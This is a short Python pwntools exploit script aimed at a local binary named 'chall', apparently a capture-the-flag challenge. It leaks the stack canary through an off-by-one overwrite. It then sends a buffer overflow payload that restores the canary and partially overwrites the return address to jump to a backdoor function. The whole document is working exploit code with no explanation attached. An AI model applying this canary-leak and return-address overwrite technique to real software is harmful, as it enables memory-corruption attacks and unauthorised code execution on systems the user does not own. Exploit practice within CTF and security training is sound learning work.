from pwn import *

p = process("./chall")

offset_from_buf_to_canary = 120
p.sendlineafter(b'Payload size:', str(offset_from_buf_to_canary + 1).encode())
p.sendlineafter(b'input!', b'REPEAT' + b'a' * (offset_from_buf_to_canary + 1 - 6))
output = p.recvuntil(b'Backdoor').split(b'\n')[2]
stack_canary = u64(output[-13:-6].ljust(8, b'\x00')) << 8

print("LEAKED STACK CANARY:", hex(stack_canary))


p.sendlineafter(b'Payload size:', str(offset_from_buf_to_canary + 18).encode())
p.sendlineafter(b'input!', b'a' * offset_from_buf_to_canary + p64(stack_canary) + p64(0) + p16(0x029a))

output = p.recvall()
print("OUTPUT:", output.decode())